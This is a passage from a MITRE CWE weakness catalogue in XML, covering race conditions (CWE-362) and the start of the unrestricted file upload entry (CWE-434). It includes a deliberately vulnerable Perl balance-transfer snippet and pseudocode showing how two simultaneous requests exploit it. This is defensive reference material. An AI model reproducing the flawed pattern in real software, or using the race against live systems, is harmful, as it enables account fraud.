            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Black box methods may be able to identify evidence of race conditions
							via methods such as multiple simultaneous connections, which may cause
							the software to become instable or crash. However, race conditions with
							very narrow timing windows would not be detectable.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>White Box</Method_Name>
               <Method_Description>
                  <Text>Common idioms are detectable in white box analysis, such as
							time-of-check-time-of-use (TOCTOU) file operations (CWE-367), or
							double-checked locking (CWE-609).</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
                  <Text>Race conditions may be detected with a stress-test by calling the
							software simultaneously from a large number of threads or processes, and
							look for evidence of any unexpected behavior.</Text>
                  <Text>Insert breakpoints or delays in between relevant code statements to
							artificially expand the race window so that it will be easier to
							detect.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Monitored Virtual Environment - run potentially malicious code
									in sandbox / wrapper / virtual machine, see if it does anything
									suspicious</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>In languages that support it, use synchronization primitives. Only
							wrap these around critical code to minimize the impact on
							performance.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use thread-safe capabilities such as the data access abstraction in
							Spring.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Minimize the usage of shared resources in order to remove as much
							complexity as possible from the control flow and to reduce the
							likelihood of unexpected conditions occurring.</Text>
                  <Text>Additionally, this will minimize the amount of synchronization
							necessary and may even help to reduce the likelihood of a denial of
							service where an attacker may be able to repeatedly trigger a critical
							section (CWE-400).</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When using multithreading and operating on shared variables, only use
							thread-safe functions.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use atomic operations on shared variables. Be wary of innocent-looking
							constructs such as "x++". This may appear atomic at the code layer, but
							it is actually non-atomic at the instruction layer, since it involves a
							read, followed by a computation, followed by a write.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use a mutex if available, but be sure to avoid related weaknesses such
							as CWE-412.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Avoid double-checked locking (CWE-609) and other implementation errors
							that arise when trying to avoid the overhead of synchronization.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Disable interrupts or signals over critical parts of the code, but
							also make sure that the code does not go into a large or infinite
							loop.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use the volatile type modifier for critical variables to avoid
							unexpected compiler optimization or reordering. This does not
							necessarily solve the synchronization problem, but it can help.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.362.11]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code could be used in an e-commerce application that supports
						transfers between accounts. It takes the total amount of the transfer, sends
						it to the new account, and deducts the amount from the original
						account.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>$transfer_amount = GetTransferAmount();</Code>
                     <Code>$balance = GetBalanceFromDatabase();</Code>
                     <Code/>
                     <Code>if ($transfer_amount &lt; 0) {</Code>
                     <Block>
                        <Code>FatalError("Bad Transfer Amount");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>$newbalance = $balance - $transfer_amount;</Code>
                     <Code>if (($balance - $transfer_amount) &lt; 0) {</Code>
                     <Block>
                        <Code>FatalError("Insufficient Funds");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>SendNewBalanceToDatabase($newbalance);</Code>
                     <Code>NotifyUser("Transfer of $transfer_amount succeeded.");</Code>
                     <Code>NotifyUser("New balance: $newbalance");</Code>
                  </Block>
                  <Text>A race condition could occur between the calls to
							GetBalanceFromDatabase() and SendNewBalanceToDatabase().</Text>
                  <Text>Suppose the balance is initially 100.00. An attack could be
							constructed as follows:</Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>PseudoCode</Code_Example_Language>
                     <Code>The attacker makes two simultaneous calls of the program, CALLER-1
								and CALLER-2. Both callers are for the same user account.</Code>
                     <Code>CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance
								that handles CALLER-1). CALLER-2 is associated with
								PROGRAM-2.</Code>
                     <Code>CALLER-1 makes a transfer request of 80.00.</Code>
                     <Code>PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to
								100.00</Code>
                     <Code>PROGRAM-1 calculates $newbalance as 20.00, then calls
								SendNewBalanceToDatabase().</Code>
                     <Code>Due to high server load, the PROGRAM-1 call to
								SendNewBalanceToDatabase() encounters a delay.</Code>
                     <Code>CALLER-2 makes a transfer request of 1.00.</Code>
                     <Code>PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to
								100.00. This happens because the previous PROGRAM-1 request was not
								processed yet.</Code>
                     <Code>PROGRAM-2 determines the new balance as 99.00.</Code>
                     <Code>After the initial delay, PROGRAM-1 commits its balance to the
								database, setting it to 20.00.</Code>
                     <Code>PROGRAM-2 sends a request to update the database, setting the
								balance to 99.00</Code>
                  </Block>
                  <Text>At this stage, the attacker should have a balance of 19.00 (due to
							81.00 worth of transfers), but the balance is 99.00, as recorded in the
							database.</Text>
                  <Text>To prevent this weakness, the programmer has several options,
							including using a lock to prevent multiple simultaneous requests to the
							web application, or using a synchronization mechanism that includes all
							the code between GetBalanceFromDatabase() and
							SendNewBalanceToDatabase().</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-24">
               <Intro_Text>The following function attempts to acquire a lock in order to
						perform operations on a shared resource.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>void f(pthread_mutex_t *mutex) {</Code>
                     <Block>
                        <Code>pthread_mutex_lock(mutex);</Code>
                        <Code/>
                        <Comment>/* access shared resource */</Comment>
                        <Code/>
                        <Code>pthread_mutex_unlock(mutex);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, the code does not check the value returned by
							pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire
							the mutex for any reason, the function may introduce a race condition
							into the program and result in undefined behavior.</Text>
                  <Text>In order to avoid data races, correctly written programs must check
							the result of thread synchronization functions and appropriately handle
							all errors, either by attempting to recover from them or reporting it to
							higher levels.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code>int f(pthread_mutex_t *mutex) {</Code>
                     <Block>
                        <Code>int result;</Code>
                        <Code/>
                        <Code>result = pthread_mutex_lock(mutex);</Code>
                        <Code>if (0 != result)</Code>
                        <Block>
                           <Code>return result;</Code>
                        </Block>
                        <Code/>
                        <Comment>/* access shared resource */</Comment>
                        <Code/>
                        <Code>return pthread_mutex_unlock(mutex);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5044</Observed_Example_Reference>
               <Observed_Example_Description>Race condition leading to a crash by calling a
						hook removal procedure while other activities are occurring at the same
						time.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2958</Observed_Example_Reference>
               <Observed_Example_Description>chain: time-of-check time-of-use (TOCTOU) race
						condition in program allows bypass of protection mechanism that was designed
						to prevent symlink attacks.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1570</Observed_Example_Reference>
               <Observed_Example_Description>chain: time-of-check time-of-use (TOCTOU) race
						condition in program allows bypass of protection mechanism that was designed
						to prevent symlink attacks.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0058</Observed_Example_Reference>
               <Observed_Example_Description>Unsynchronized caching operation enables a race
						condition that causes messages to be sent to a deallocated
						object.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0379</Observed_Example_Reference>
               <Observed_Example_Description>Race condition during initialization triggers a
						buffer overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-6599</Observed_Example_Reference>
               <Observed_Example_Description>Daemon crash by quickly performing operations and
						undoing them, which eventually leads to an operation that does not acquire a
						lock.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-6180</Observed_Example_Reference>
               <Observed_Example_Description>chain: race condition triggers NULL pointer
						dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5794</Observed_Example_Reference>
               <Observed_Example_Description>Race condition in library function could cause
						data to be sent to the wrong process.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-3970</Observed_Example_Reference>
               <Observed_Example_Description>Race condition in file parser leads to heap
						corruption.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5021</Observed_Example_Reference>
               <Observed_Example_Description>chain: race condition allows attacker to access an
						object while it is still being initialized, causing software to access
						uninitialized memory.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4895</Observed_Example_Reference>
               <Observed_Example_Description>chain: race condition for an argument value,
						possibly resulting in NULL dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3547</Observed_Example_Reference>
               <Observed_Example_Description>chain: race condition might allow resource to be
						released before operating on it, leading to NULL dereference
					</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Research_Gaps>
            <Research_Gap>
               <Text>Race conditions in web applications are under-studied and probably
						under-reported. However, in 2008 there has been growing interest in this
						area.</Text>
            </Research_Gap>
            <Research_Gap>
               <Text>Much of the focus of race condition research has been in Time-of-check
						Time-of-use (TOCTOU) variants (CWE-367), but many race conditions are
						related to synchronization problems that do not necessarily require a
						time-of-check.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.362.1">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 13: Race Conditions." Page 205</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.362.2">
               <Reference_Author>Andrei Alexandrescu</Reference_Author>
               <Reference_Title>volatile - Multithreaded Programmer's Best
						Friend</Reference_Title>
               <Reference_Publication>Dr. Dobb's</Reference_Publication>
               <Reference_Date>2008-02-01</Reference_Date>
               <Reference_Link>http://www.ddj.com/cpp/184403766</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.3">
               <Reference_Author>Steven Devijver</Reference_Author>
               <Reference_Title>Thread-safe webapps using Spring</Reference_Title>
               <Reference_Link>http://www.javalobby.org/articles/thread-safe/index.jsp</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.4">
               <Reference_Author>David Wheeler</Reference_Author>
               <Reference_Title>Prevent race conditions</Reference_Title>
               <Reference_Date>2007-10-04</Reference_Date>
               <Reference_Link>http://www.ibm.com/developerworks/library/l-sprace.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.5">
               <Reference_Author>Matt Bishop</Reference_Author>
               <Reference_Title>Race Conditions, Files, and Security Flaws; or the Tortoise and
						the Hare Redux</Reference_Title>
               <Reference_PubDate>September 1995</Reference_PubDate>
               <Reference_Link>http://www.cs.ucdavis.edu/research/tech-reports/1995/CSE-95-9.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.6">
               <Reference_Author>David Wheeler</Reference_Author>
               <Reference_Title>Secure Programming for Linux and Unix HOWTO</Reference_Title>
               <Reference_Date>2003-03-03</Reference_Date>
               <Reference_Link>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.7">
               <Reference_Author>Blake Watts</Reference_Author>
               <Reference_Title>Discovering and Exploiting Named Pipe Security Flaws for Fun
						and Profit</Reference_Title>
               <Reference_PubDate>April 2002</Reference_PubDate>
               <Reference_Link>http://www.blakewatts.com/namedpipepaper.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.8">
               <Reference_Author>Roberto Paleari</Reference_Author>
               <Reference_Author>Davide Marrone</Reference_Author>
               <Reference_Author>Danilo Bruschi</Reference_Author>
               <Reference_Author>Mattia Monga</Reference_Author>
               <Reference_Title>On Race Vulnerabilities in Web Applications</Reference_Title>
               <Reference_Link>http://security.dico.unimi.it/~roberto/pubs/dimva08-web.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.9">
               <Reference_Title>Avoiding Race Conditions and Insecure File
						Operations</Reference_Title>
               <Reference_Publication>Apple Developer Connection</Reference_Publication>
               <Reference_Link>http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.362.10">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 25 - Race Conditions</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-26</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/26/top-25-series-rank-25-race-conditions/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.362.11">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Race Conditions</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Do not simultaneously open the same file multiple
						times</Mapped_Node_Name>
               <Mapped_Node_ID>FIO31-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not assume that a group of calls to independently atomic
						methods is atomic</Mapped_Node_Name>
               <Mapped_Node_ID>VNA03-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not simultaneously open the same file multiple
						times</Mapped_Node_Name>
               <Mapped_Node_ID>FIO31-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Use lock classes for mutex management</Mapped_Node_Name>
               <Mapped_Node_ID>CON02-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>26</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>29</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Contribution Contribution_Mode="Content">
               <Contributor>Martin Sebor</Contributor>
               <Contribution_Organization>Cisco Systems, Inc. </Contribution_Organization>
               <Contribution_Date>2010-04-30</Contribution_Date>
               <Contribution_Comment>Provided Demonstrative Example</Contribution_Comment>
            </Contribution>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Demonstrative_Examples, Description, Likelihood_of_Exploit,
						Maintenance_Notes, Observed_Examples, Potential_Mitigations, References,
						Relationships, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples,
						Description, Name, Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Race
						Conditions</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-12-13">Race
						Condition</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="434" Name="Unrestricted Upload of File with Dangerous Type" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software allows the attacker to upload or transfer files of
					dangerous types that can be automatically processed within the product's
					environment.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>429</Relationship_Target_ID>
               <!--Handler Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>669</Relationship_Target_ID>
               <!--Incorrect Resource Transfer Between Spheres--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>351</Relationship_Target_ID>
               <!--Insufficient Type Distinction--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>436</Relationship_Target_ID>
               <!--Interpretation Conflict--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>430</Relationship_Target_ID>
               <!--Deployment of Wrong Handler--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">631</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>632</Relationship_Target_ID>
               <!--Weaknesses that Affect Files or Directories--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>714</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A3 - Malicious File Execution--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
